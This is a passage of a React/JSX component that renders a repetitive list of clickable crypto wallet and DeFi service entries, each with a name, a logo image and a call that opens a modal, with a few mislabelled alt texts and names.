          <div onClick={() => this.showModalFunc('Harvest Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Harvest Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={harvest}
                alt="Harvest wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Octofi')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Octofi</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={octofi}
                alt="Harvest wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Mushroom Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Mushroom Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mushroom}
                alt="Mushroom wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('BitFrost')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">BitFrost Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bitfrost}
                alt="Bitfrost wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Orchid Protocol')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Orchid Protocol</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={orchid}
                alt="Orchid wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Datamine Network')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Datamine Network</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={datamine}
                alt="Datamine Network wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Streamr')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Streamr</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={streamr}
                alt="Streamr wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DappRadar')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">DappRadar</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dappradar}
                alt="DappRadar wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SuperRare')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">SuperRare</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={superrare}
                alt="DappRadar wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Arbitrum')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Arbitrum</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={arbitrum}
                alt="Arbitrum wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Paraswap')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Paraswap</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={paraswap}
                alt="Paraswap wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Honeyswap')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">HoneySwap</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={honeyswap}
                alt="Honeyswap wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Fleek')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">HoneySwap</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={fleek}
                alt="Fleek wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Cool')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Cool Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={cool}
                alt="Cool wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Alpha')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Alpha Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={alpha}
                alt="Alpha wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Zelcore')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Zelcore</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={zelcore}
                alt="Zelcore wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Phantom')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Phantom Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={phantom}
                alt="Phantom wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Solflare')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Solflare Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={solflare}
                alt="Solflare wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Sollet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Sollet Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={sollet}
                alt="Sollet wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Dcent')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">{"D'CENT Wallet"}</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dcent}
                alt="dcent wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Tokenary')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Tokenary</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={tokenary}
                alt="Tokenary wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Spatium')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Spatium</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={spatium}
                alt="Spatium wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Infinito')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Infinito</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={infinito}
                alt="Infinito wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Wallet.io')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Wallet.io</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={wallet}
                alt="wallet.io wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Infinity')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Infinity Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={infinity}
                alt="Infinity wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Ownbit')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Ownbit Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ownbit}
                alt="Infinity wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('EasyPocket')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">EasyPocket Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={easypocket}
                alt="Easy Pocket wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Bridge')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Bridge Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bridge}
                alt="Bridge wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Unstoppable')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Unstoppable Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={unstoppable}
                alt="Unstoppable wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('PeakDefi')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">PEAKDEFI Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={peakdefi}
                alt="PeakDefi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Vision')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Vision</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={vision}
                alt="Vision"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Bitkeep')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
